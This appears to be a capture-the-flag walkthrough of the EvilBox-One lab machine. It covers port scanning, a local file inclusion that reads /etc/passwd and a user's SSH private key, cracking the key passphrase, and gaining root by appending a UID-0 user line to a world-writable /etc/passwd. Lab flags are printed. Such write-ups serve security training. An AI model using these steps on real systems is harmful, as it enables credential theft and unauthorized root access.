---
title: EvilBox-One
categories: [Proving Grounds, Play]
tags: [LFI, PrivEsc, passwd]
image:
  path: https://i0.wp.com/pentestguy.com/wp-content/uploads/2023/07/evilbox-one-vulnhub-ctf-walkthrough-pentestguy.png?fit=1080%2C720&ssl=1
  width: "1200"
  height: "630"
  alt:  EvilBox-One Machine 🖥️
---



### Lets find out the IP of this Machine First ➡️

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled.png)

```bash
IP : 10.10.2.51
```
{: .nolineno}
{: .nolineno}

## Port Scan Results ➡️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/EvilBox-One]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.51
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 16:54 IST
Nmap scan report for 10.0.2.51
Host is up (0.00066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 4495500be473a18511ca10ec1ccbd426 (RSA)
|   256 27db6ac73a9c5a0e47ba8d81ebd6d63c (ECDSA)
|_  256 e30756a92563d4ce3901c19ad9fede64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:94:F8:26 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}
{: .nolineno}

## Web Enumeration ➡️

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%201.png)

Now lets see the Directory Listing files —>

```bash
feroxbuster -u http://10.0.2.51:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o ferox_80.json --depth 2 -C 403,404 -x php,html,txt,js
```
{: .nolineno}
{: .nolineno}

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%202.png)

Now lets look at `/secret/evil.php` file —>

Since it is blank I think this url is vulnerable to directory traversal attack , but for that I need a parameter on which basis I am gona search the `/etc/passwd` file —>   

Lets use burpsuite for that —>

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%203.png)

parameter fuzzing list ⤵️

[https://github.com/StrongShiv8/Wordlists-/blob/main/fuzz-lfi-params-list.txt](https://github.com/StrongShiv8/Wordlists-/blob/main/fuzz-lfi-params-list.txt)

Lets see the result on web —>

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%204.png)

Now I know user mowree so lets access for ssh private key through `/home/mowree/.ssh/id_rsa` →

[http://10.0.2.51/secret/evil.php?command=/home/mowree/.ssh/id_rsa](http://10.0.2.51/secret/evil.php?command=/home/mowree/.ssh/id_rsa)

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%205.png)

Lets get this file and decode its paraphrase value through john-the-ripper tool →

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%206.png)

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%207.png)

so the paraphrase for ssh login is : `unicorn`

Now its time for ssh login →

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%208.png)

Lets check what we got here →

```bash
mowree@EvilBoxOne:~$ ls -al
total 32
drwxr-xr-x 4 mowree mowree 4096 ago 16  2021 .
drwxr-xr-x 3 root   root   4096 ago 16  2021 ..
lrwxrwxrwx 1 root   root      9 ago 16  2021 .bash_history -> /dev/null
-rwxr-xr-x 1 mowree mowree  220 ago 16  2021 .bash_logout
-rwxr-xr-x 1 mowree mowree 3526 ago 16  2021 .bashrc
drwxr-xr-x 3 mowree mowree 4096 ago 16  2021 .local
-rwxr-xr-x 1 mowree mowree  807 ago 16  2021 .profile
drwxr-xr-x 2 mowree mowree 4096 ago 16  2021 .ssh
-r-------- 1 mowree mowree   31 ago 16  2021 user.txt
mowree@EvilBoxOne:~$ cat user.txt 
56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
mowree@EvilBoxOne:~$
```
{: .nolineno}
{: .nolineno}

Now lets see some file permissions and looks like I got something interesting →

```bash
mowree@EvilBoxOne:/var/backups$ ls -al /etc/passwd
-rw-rw-rw- 1 root root 1398 ago 16  2021 /etc/passwd
```
{: .nolineno}
{: .nolineno}

Now I have the permission to write so lets add a user name as `shiv` and `password` as password with root privileges.

First we need to choose a password, salt it and hash the result. openssl to the rescue.

Flags:

- -`1` what hashing algorithm to use. In our use case it doesnt matter, therefore we use MD5 which should be avoided in real world PT as it is not secure.
- -`salt salt` string to use as salt. I choose the string salt
- `password` clear text password we would like to use.

```bash
$ openssl passwd -1 -salt salt password
$1$salt$qJH7.N4xYta3aEG/dfqo/0
```
{: .nolineno}
{: .nolineno}

we need to add some data in order for it to be aligned with the `/etc/passwd` format. This is the final result:

```bash
shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
```
{: .nolineno}
{: .nolineno}

I named the user `shiv`. now lets write into the `/etc/passwd` file with nano →

![Untitled](/Vulnhub-Files/img/EvilBox-One/Untitled%209.png)

Now lets switch to shiv user —>

```bash
mowree@EvilBoxOne:~$ su shiv
Contraseña: 
root@EvilBoxOne:/home/mowree# whoami
root
root@EvilBoxOne:/home/mowree# cd ~
root@EvilBoxOne:~# ls -al
total 24
drwx------  3 root root 4096 ago 16  2021 .
drwxr-xr-x 18 root root 4096 ago 16  2021 ..
lrwxrwxrwx  1 root root    9 ago 16  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3526 ago 16  2021 .bashrc
drwxr-xr-x  3 root root 4096 ago 16  2021 .local
-rw-r--r--  1 root root  148 ago 17  2015 .profile
-r--------  1 root root   31 ago 16  2021 root.txt
root@EvilBoxOne:~# cat root.txt 
36QtXfdJWvdC0VavlPIApUbDlqTsBM
root@EvilBoxOne:~#
```
{: .nolineno}

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }